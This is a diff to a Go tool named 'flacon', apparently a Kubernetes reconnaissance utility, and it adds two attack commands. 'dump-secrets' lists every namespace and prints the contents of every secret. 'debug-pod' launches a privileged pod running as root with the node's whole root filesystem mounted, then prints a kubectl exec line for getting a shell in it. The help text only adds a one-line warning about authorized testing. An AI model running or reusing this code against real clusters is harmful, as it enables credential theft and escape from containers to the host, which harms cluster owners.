@@ -10,6 +10,7 @@ import (
 	"path/filepath"
 	"runtime"
 	"strings"
+	"time"
 
 	"gopkg.in/yaml.v3"
 
@@ -51,6 +52,14 @@ func main() {
 		case "quick", "--quick":
 			// Quick scan mode - skip filesystem scanning
 			runQuickScan()
+			return
+		case "dump-secrets", "--dump-secrets":
+			// Dump secrets from all accessible namespaces
+			dumpAllSecrets()
+			return
+		case "debug-pod", "--debug-pod":
+			// Create a privileged debug pod
+			createDebugPod()
 			return
 		}
 	}
@@ -176,16 +185,23 @@ Commands:
   version, -v, --version    Show version information
   help, -h, --help         Show this help message
   quick, --quick           Run quick reconnaissance (skip filesystem scan)
+  dump-secrets, --dump-secrets  Dump secrets from all accessible namespaces
+  debug-pod, --debug-pod   Create a privileged debug pod
   (no args)                Run full Kubernetes reconnaissance
 
 Examples:
   flacon                   Run full reconnaissance and output YAML
   flacon quick             Run quick reconnaissance (faster)
+  flacon dump-secrets      Dump all secrets from all namespaces
+  flacon debug-pod         Create a privileged debug pod
   flacon version           Show version information
   flacon --help            Show help message
 
 Note: Full reconnaissance includes filesystem scanning which can be slow on large systems.
 Use 'quick' mode for faster results without filesystem scanning.
+
+WARNING: dump-secrets and debug-pod commands require appropriate Kubernetes permissions
+and should only be used for authorized security testing.
 
 `, version.String())
 }
@@ -510,4 +526,164 @@ func checkPodCreationRights() bool {
 
 	fmt.Println("   ✅ Pod creation permissions confirmed")
 	return true
+}
+
+func dumpAllSecrets() {
+	fmt.Println("🔍 Starting secrets dump from all accessible namespaces...")
+	fmt.Println("📋 Version:", version.String())
+
+	config, err := rest.InClusterConfig()
+	if err != nil {
+		fmt.Printf("❌ Failed to get in-cluster config: %v\n", err)
+		return
+	}
+
+	clientset, err := kubernetes.NewForConfig(config)
+	if err != nil {
+		fmt.Printf("❌ Failed to create clientset: %v\n", err)
+		return
+	}
+
+	// Get all namespaces
+	namespaces, err := clientset.CoreV1().Namespaces().List(context.TODO(), metav1.ListOptions{})
+	if err != nil {
+		fmt.Printf("❌ Failed to list namespaces: %v\n", err)
+		return
+	}
+
+	fmt.Printf("📁 Found %d accessible namespaces\n", len(namespaces.Items))
+
+	totalSecrets := 0
+	for _, ns := range namespaces.Items {
+		namespace := ns.Name
+		fmt.Printf("\n🔍 Scanning namespace: %s\n", namespace)
+
+		secrets, err := clientset.CoreV1().Secrets(namespace).List(context.TODO(), metav1.ListOptions{})
+		if err != nil {
+			fmt.Printf("   ❌ Failed to list secrets in %s: %v\n", namespace, err)
+			continue
+		}
+
+		fmt.Printf("   📦 Found %d secrets\n", len(secrets.Items))
+
+		for _, secret := range secrets.Items {
+			totalSecrets++
+			fmt.Printf("   🔐 Secret: %s (Type: %s)\n", secret.Name, secret.Type)
+
+			// Dump secret data (base64 encoded)
+			for key, value := range secret.Data {
+				fmt.Printf("      Key: %s, Value: %s\n", key, string(value))
+			}
+		}
+	}
+
+	fmt.Printf("\n✅ Secrets dump complete: %d total secrets found\n", totalSecrets)
+}
+
+func createDebugPod() {
+	fmt.Println("🔍 Creating privileged debug pod...")
+	fmt.Println("📋 Version:", version.String())
+
+	config, err := rest.InClusterConfig()
+	if err != nil {
+		fmt.Printf("❌ Failed to get in-cluster config: %v\n", err)
+		return
+	}
+
+	clientset, err := kubernetes.NewForConfig(config)
+	if err != nil {
+		fmt.Printf("❌ Failed to create clientset: %v\n", err)
+		return
+	}
+
+	// Get current namespace
+	namespace := os.Getenv("POD_NAMESPACE")
+	if namespace == "" {
+		if nsBytes, err := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
+			namespace = strings.TrimSpace(string(nsBytes))
+		} else {
+			namespace = "default"
+		}
+	}
+
+	fmt.Printf("📍 Creating debug pod in namespace: %s\n", namespace)
+
+	// Create a privileged debug pod
+	debugPod := &corev1.Pod{
+		TypeMeta: metav1.TypeMeta{
+			Kind:       "Pod",
+			APIVersion: "v1",
+		},
+		ObjectMeta: metav1.ObjectMeta{
+			Name:      "flacon-debug-pod",
+			Namespace: namespace,
+			Labels: map[string]string{
+				"app": "flacon-debug",
+			},
+		},
+		Spec: corev1.PodSpec{
+			Containers: []corev1.Container{
+				{
+					Name:    "debug",
+					Image:   "busybox:latest",
+					Command: []string{"sleep", "3600"},
+					SecurityContext: &corev1.SecurityContext{
+						Privileged: &[]bool{true}[0],
+						RunAsUser:  &[]int64{0}[0],
+					},
+					VolumeMounts: []corev1.VolumeMount{
+						{
+							Name:      "host-root",
+							MountPath: "/host",
+						},
+					},
+				},
+			},
+			Volumes: []corev1.Volume{
+				{
+					Name: "host-root",
+					VolumeSource: corev1.VolumeSource{
+						HostPath: &corev1.HostPathVolumeSource{
+							Path: "/",
+						},
+					},
+				},
+			},
+			RestartPolicy: corev1.RestartPolicyNever,
+		},
+	}
+
+	// Create the pod
+	createdPod, err := clientset.CoreV1().Pods(namespace).Create(context.TODO(), debugPod, metav1.CreateOptions{})
+	if err != nil {
+		fmt.Printf("❌ Failed to create debug pod: %v\n", err)
+		return
+	}
+
+	fmt.Printf("✅ Debug pod created successfully!\n")
+	fmt.Printf("   Name: %s\n", createdPod.Name)
+	fmt.Printf("   Namespace: %s\n", createdPod.Namespace)
+	fmt.Printf("   Status: %s\n", createdPod.Status.Phase)
+
+	// Wait for pod to be ready
+	fmt.Println("⏳ Waiting for pod to be ready...")
+	for i := 0; i < 30; i++ {
+		pod, err := clientset.CoreV1().Pods(namespace).Get(context.TODO(), createdPod.Name, metav1.GetOptions{})
+		if err != nil {
+			fmt.Printf("❌ Failed to get pod status: %v\n", err)
+			return
+		}
+
+		if pod.Status.Phase == corev1.PodRunning {
+			fmt.Println("✅ Debug pod is running!")
+			fmt.Printf("   To access the pod: kubectl exec -it %s -n %s -- /bin/sh\n", createdPod.Name, namespace)
+			fmt.Printf("   To delete the pod: kubectl delete pod %s -n %s\n", createdPod.Name, namespace)
+			return
+		}
+
+		fmt.Printf("   Status: %s\n", pod.Status.Phase)
+		time.Sleep(2 * time.Second)
+	}
+
+	fmt.Println("⚠️  Pod creation timed out, but pod may still be starting")
 }
